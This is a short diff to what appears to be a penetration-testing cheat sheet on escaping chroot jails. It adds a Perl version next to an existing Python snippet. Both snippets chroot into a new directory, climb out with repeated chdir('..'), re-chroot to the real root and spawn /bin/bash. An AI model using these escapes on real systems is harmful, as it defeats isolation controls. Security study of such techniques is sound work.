@@ -31,7 +31,7 @@ int main(void)
 ```
 {% endcode %}
 
-Using python:
+Using **python**:
 
 ```python
 #!/usr/bin/python
@@ -42,6 +42,19 @@ for i in range(1000):
     os.chdir("..")
 os.chroot(".")
 os.system("/bin/bash")
+```
+
+Using **perl**:
+
+```perl
+#!/usr/bin/perl
+mkdir "chroot-dir";
+chroot "chroot-dir";
+foreach my $i (0..1000) {
+    chdir ".."
+}
+chroot ".";
+system("/bin/bash");
 ```
 
 ## Modify PATH
